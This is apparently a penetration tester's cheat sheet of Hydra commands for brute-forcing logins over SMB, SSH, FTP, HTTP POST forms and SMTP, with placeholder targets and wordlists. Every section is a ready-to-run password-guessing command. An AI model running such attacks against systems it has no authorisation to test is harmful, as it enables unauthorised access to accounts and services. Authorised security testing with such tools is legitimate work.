# Brute force passwords over SMB
```sh
hydra -l [user] -P [path_to_passwords] smb://[ip]
```

# Brute force passwords over SSH
```sh
hydra -L [path_to_usernames] -P [/usr/share/wordlists/fasttrack.txt] ssh://[targe]
```

# Brute force usernames and passwords over FTP
```sh
hydra -L [path_to_usernames] -P [path_to_passwords] -u -e snr -s [port] [targe] ftp
```

# Brute force usernames and passwords over HTTP-POST-FORM
```sh
hydra -L [path_to_usernames] -P [path_to_passwords] -s [port] [targe] http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect information"
# "page:payload:error"
```

# Brute force usernames and passwords over SMTP (TLS)
```sh
hydra -L [path_to_usernames] -P [path_to_passwords] -s 25 -m TLS -v -V smtp://[targe]
```
